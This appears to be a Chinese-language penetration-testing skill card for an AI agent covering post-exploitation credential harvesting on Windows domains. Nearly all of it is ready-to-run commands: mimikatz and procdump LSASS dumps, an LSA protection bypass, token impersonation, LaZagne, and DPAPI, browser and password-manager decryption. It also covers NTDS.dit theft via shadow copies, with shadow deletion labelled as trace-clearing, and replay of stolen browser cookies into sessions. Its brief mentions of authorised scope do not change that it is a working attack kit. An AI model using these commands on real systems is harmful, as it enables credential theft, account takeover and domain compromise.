---
name: 偷生
description: >-
  内网凭据收割全集：LSASS转储+LSA防护绕过、LaZagne全量收割、
  Token窃取(incognito)、DPAPI解密、浏览器凭据(HackBrowserData/SharpWeb/SharpDPAPI)、
  密码管理器解密(Navicat/xshell-xftp/mRemoteNG)、卷影拷贝获取NTDS.dit。
  触发：拿到本地管理员权限后凭据收割、读密码、DPAPI、浏览器密码、Navicat密码时使用。
  离线 Chrome.rar / cookies.sqlite / fingerprint.json+passwords.json 走本卡离线段
  browser_loot_triage.py（不打印值）。Web 开放目录/.env/.claude 走 sensitive-dir-dump。
version: 1.0.0
author: 大爱仙尊
metadata:
  source_ref: "域渗透一条龙手册 §1.4 / §2.1"
---

> **盗天**
> 自身本是轮回客，踏遍万里寻归途！
> 盗亦有道留一线，手到偷来不问途。

# 凭据收割全集（credential-harvest）

## 触发条件

Web 开放目录 / `.env` / `.claude` / Index of **不走本卡**，走 `sensitive-dir-dump`。

已有本地管理员权限，需要系统性收割所有凭据来源时使用：
- LSASS 转储 / mimikatz / pypykatz
- Token 窃取 / incognito
- DPAPI 解密（浏览器/凭据管理器存储）
- 浏览器明文凭据（Chrome/Edge/Firefox）
- 密码管理器（Navicat/xshell/mRemoteNG）
- 卷影拷贝提取 NTDS.dit

---

## 1. LSASS 转储（核心）

```powershell
# 方法一：procdump（微软签名工具，绕过大多数 AV）
.\procdump.exe -accepteula -ma lsass.exe lsass.dmp

# 方法二：mimikatz 直接读（内存操作）
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
.\mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::sam" "exit"

# 方法三：从 dump 文件离线分析
.\mimikatz.exe "privilege::debug" "sekurlsa::minidump lsass.dmp" "sekurlsa::logonPasswords" "exit"

# 方法四：CME 远程转储
crackmapexec smb <IP> -u <user> -p '<pass>' -M lsassy
crackmapexec smb <IP> -u <user> -p '<pass>' --sam
crackmapexec smb <IP> -u <user> -p '<pass>' --lsa
crackmapexec smb <IP> -u <user> -p '<pass>' --ntds   # 仅域控

# 方法五：pypykatz（Linux 攻击机解析 dump）
pip install pypykatz
pypykatz lsa minidump lsass.dmp
```

---

## 2. 绕过 LSA 防护（PPL）读取密码

```powershell
# 方法一：PPLdump（推荐）
.\PPLdump64.exe lsass.exe lsass.dmp
# 或指定 PID
.\PPLdump64.exe 756 lsass.dmp

# 方法二：mimikatz + mimidriver（需加载内核驱动）
.\mimikatz.exe "!+" "!processprotect /process:lsass.exe /remove" \
  "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" \
  "!processprotect /process:lsass.exe" "!-" "exit"
# 需要 mimidriver.sys 在同目录
```

---

## 3. Token 窃取（incognito）

```powershell
# 列出可用 token
.\incognito.exe list_tokens -u

# 模拟指定 token 执行命令
.\incognito.exe execute -c "<domain>\<user>" powershell.exe

# Metasploit 中使用
use incognito
list_tokens -u
impersonate_token <domain>\\<user>
```

---

## 4. 一键全量收割（LaZagne）

```powershell
# 收割所有存储密码（浏览器/邮件/数据库/VPN/SSH等）
.\lazagne.exe all

# 仅浏览器
.\lazagne.exe browsers

# 仅数据库
.\lazagne.exe databases

# 仅 Windows 凭据
.\lazagne.exe windows
```

---

## 5. DPAPI 解密

```powershell
# SharpDPAPI — 解密当前用户 DPAPI blob
.\SharpDPAPI.exe triage           # 枚举本机所有 DPAPI blob
.\SharpDPAPI.exe credentials      # 解密 Windows 凭据
.\SharpDPAPI.exe chrome           # 解密 Chrome 密码
.\SharpDPAPI.exe rdg              # 解密 Remote Desktop Gateway 密码

# mimikatz DPAPI
.\mimikatz.exe "privilege::debug" "token::elevate" \
  "dpapi::chrome /in:\"%localappdata%\Google\Chrome\User Data\Default\Login Data\" /unprotect" "exit"

# dpapi masterkey（域控可解密所有用户）
.\mimikatz.exe "privilege::debug" "sekurlsa::dpapi" "exit"
```

---

## 6. 浏览器凭据提取

```bash
# HackBrowserData（跨平台，支持 Chrome/Edge/Firefox/Safari）
# https://github.com/moonD4rk/HackBrowserData
./HackBrowserData -b all -f json -o ./output

# SharpWeb（域内 Windows）
.\SharpWeb.exe all

# SharpDPAPI（Chrome 专项，需系统权限）
.\SharpDPAPI.exe chrome /unprotect

# 360SafeBrowsergetpass
.\360SafeBrowsergetpass.exe

# BrowserGhost
.\BrowserGhost.exe
```

### 离线包（窃密 rar / Firefox sqlite）——先分诊再回灌授权域

```bash
python3 炼蛊房/browser_loot_triage.py from-case --case <案卷> --url https://授权域
python3 炼蛊房/browser_loot_triage.py replay --path <包> --url https://授权域 --case <案卷>
python3 炼蛊房/browser_loot_triage.py triage --path <cookies.sqlite|解压目录|.rar> --case <案卷>
python3 炼蛊房/browser_loot_triage.py export-scope --path <包> --domain 授权域 --case <案卷>
python3 炼蛊房/session_import.py --domain 授权域 \
  --input 案卷/<案>/案卷/browser_loot/SCOPE_COOKIES.json \
  --out 案卷/<案>/接管/session
```

认族：`moz_cookies` = Firefox；`fingerprint.json` + `Default/cookies.json` = Chrome 窃密包。  
`replay` 收了原 `9.py`：整包 Cookie + 指纹 UA 打 `--url`（必须 in_scope）。`--whole-jar` 把域名改写到目标 host。  
`tokens.json` 的 `AccountId-*` 是 GAIA，不是网站 JWT。屏幕不打印 Cookie 值。  
手法：`传承/窗·余烬.md`。

---

## 7. 密码管理器解密

### Navicat（版本 11/12）

```powershell
# 注册表路径（连接密码存储位置）
# HKEY_CURRENT_USER\Software\PremiumSoft\Navicat\Servers\<连接名>\Password

# Python 解密脚本
pip install pycryptodome
# 脚本：https://github.com/HyperSine/how-does-navicat-encrypt-password
python navicat-password-decrypt.py

# FatSmallTools
# https://github.com/tianhe1986/FatSmallTools
```

### xshell / xftp

```powershell
# 凭据存储位置：%APPDATA%\NetSarang\Xshell\Sessions\*.xsh
# 解密工具：https://github.com/dzxs/Xdecrypt
.\Xdecrypt.exe

# 或手动读取注册表
reg query "HKCU\Software\NetSarang"
```

### mRemoteNG

```powershell
# 配置文件位置：%APPDATA%\mRemoteNG\confCons.xml
# 包含 Base64 加密的密码（AES-128-CBC，密钥可恢复）

# 解密工具（Python）
# https://github.com/haseebT/mRemoteNG-Decrypt
python mremoteng_decrypt.py -s <encrypted_password>

# 批量解密整个配置文件
python mremoteng_decrypt.py -f "%APPDATA%\mRemoteNG\confCons.xml"
```

---

## 8. 卷影拷贝提取 NTDS.dit（域控）

```powershell
# 方法一：vssadmin（域控管理员权限）
vssadmin create shadow /for=C:
# 记录卷名，例如 \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\Temp\NTDS.dit
reg save HKLM\SYSTEM C:\Temp\SYSTEM.hive
reg save HKLM\SECURITY C:\Temp\SECURITY.hive
vssadmin delete shadows /for=C: /quiet   # 清除痕迹

# 方法二：mklink 直接访问卷影
diskshadow list shadows all
mklink /d C:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\

# 方法三：ntdsutil（最隐蔽）
ntdsutil "ac i ntds" "ifm" "create full C:\Temp\ntds_ifm" q q

# 解密（攻击机）
secretsdump.py -ntds C:\Temp\NTDS.dit -system C:\Temp\SYSTEM.hive LOCAL -outputfile ntlm_hashes
```

---

## 9. Hash 破解速查表

| Hash 类型 | hashcat -m | john --format | 示例 |
|---|---|---|---|
| LM | 3000 | lm | `hashcat -m 3000 -a 3 hash.txt` |
| NTLM | 1000 | nt | `hashcat -m 1000 -a 3 hash.txt` |
| NTLMv1 | 5500 | netntlm | `hashcat -m 5500 -a 3 hash.txt` |
| NTLMv2 | 5600 | netntlmv2 | `hashcat -m 5600 -a 0 hash.txt rockyou.txt` |
| Kerberos TGS（Kerberoast）| 13100 | krb5tgs | `hashcat -m 13100 -a 0 spn.txt rockyou.txt` |
| Kerberos ASREP | 18200 | — | `hashcat -m 18200 -a 0 asrep.txt rockyou.txt` |

---

## 10. 常用工具下载地址

| 工具 | 用途 | 地址 |
|---|---|---|
| LaZagne | 全量收割 | https://github.com/AlessandroZ/LaZagne |
| mimikatz | LSASS/DPAPI | https://github.com/gentilkiwi/mimikatz |
| PPLdump | LSA PPL 绕过 | https://github.com/itm4n/PPLdump |
| SharpDPAPI | DPAPI + 浏览器 | https://github.com/GhostPack/SharpDPAPI |
| HackBrowserData | 浏览器凭据 | https://github.com/moonD4rk/HackBrowserData |
| incognito | Token 窃取 | 集成在 Metasploit |
| FatSmallTools | Navicat 解密 | https://github.com/tianhe1986/FatSmallTools |
| Xdecrypt | xshell 解密 | https://github.com/dzxs/Xdecrypt |
| mRemoteNG-Decrypt | mRemoteNG 解密 | https://github.com/haseebT/mRemoteNG-Decrypt |

---

## 11. Web / Linux 凭据面（无域控时）

- 配置与 `.env` / SSH key / `/etc/shadow` / 数据库 dump → 先 `sensitive-dir-dump`（开放目录）或 shell 内读
- 浏览器离线包 `Chrome.rar` / `cookies.sqlite` → `browser_loot_triage.py`
- 云 AK/STS → Playbook `云府·临钥.md`

## 12. 收尾清理清单（授权内收工）

持久化 / 外带属高破坏操作，须已授权。轻资产优先。

- [ ] 撤自己加的用户 / `authorized_keys` / cron / 计划任务 / Run 键 / WMI 订阅
- [ ] 拆隧道（chisel/frp/SSH `-R`）
- [ ] 恢复被改 ACL / AdminSDHolder
- [ ] 证据已进案卷后再出报告；报告不写未确认项

## 真源

本库入口（授权主机上先排后门，再收割）：

- `炼蛊房/host_ir_check.py` — Linux 排后门 / 隐藏用户 / preload
- `炼蛊房/windows_lpe_checker.py` — Windows 提权面（凭据收割前先看）
- Playbook `传承/自我守护.md`

旁路：

- LSASS/横向：`杀招/横走`
- Token 窃取原理：`Token窃取那些事`
- AD 域凭据转储：`杀招/武庸·窗府` §3/§4
- 容器内凭据：`杀招/青丘`
